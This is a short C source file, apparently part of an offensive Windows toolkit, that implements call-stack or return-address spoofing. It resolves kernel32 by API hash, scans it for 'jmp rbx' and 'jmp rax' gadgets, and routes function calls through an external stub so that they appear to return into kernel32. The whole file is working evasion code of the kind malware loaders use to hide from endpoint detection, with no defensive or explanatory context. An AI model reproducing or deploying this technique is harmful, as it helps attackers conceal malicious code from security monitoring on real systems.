#include "spoof.h"
#include "api.h"

PVOID FindGadget(PVOID pModule, fnCheckGadget CallbackCheck)
{
	for (int i = 0;; i++)
	{
		if (CallbackCheck((UINT_PTR)pModule + i))
			return (UINT_PTR)pModule + i;
	}
}

BOOL fnGadgetJmpRbx(PVOID pAddr)
{
	if (
		((PBYTE)pAddr)[0] == 0xFF &&
		((PBYTE)pAddr)[1] == 0x23
		)
		return TRUE;
	else
		return FALSE;
}

BOOL fnGadgetJmpRax(PVOID pAddr)
{

	if (
		((PBYTE)pAddr)[0] == 0xFF &&
		((PBYTE)pAddr)[1] == 0xe0
		)
		return TRUE;
	else
		return FALSE;
}

PVOID Spoofer(PVOID pFunction, PVOID pArg1, PVOID pArg2, PVOID pArg3, PVOID pArg4, PVOID pArg5, PVOID pArg6, PVOID pArg7, PVOID pArg8)
{
	PVOID pGadgetAddr = NULL;
	PVOID pK32 = fnGetModuleHandle(0x6ddb9555);
	pGadgetAddr = FindGadget(pK32, fnGadgetJmpRbx);
	PRM param = { pGadgetAddr, pFunction };

	PVOID pRet = SpoofStub(pArg1, pArg2, pArg3, pArg4, &param, NULL, pArg5, pArg6, pArg7, pArg8);
	return pRet;
}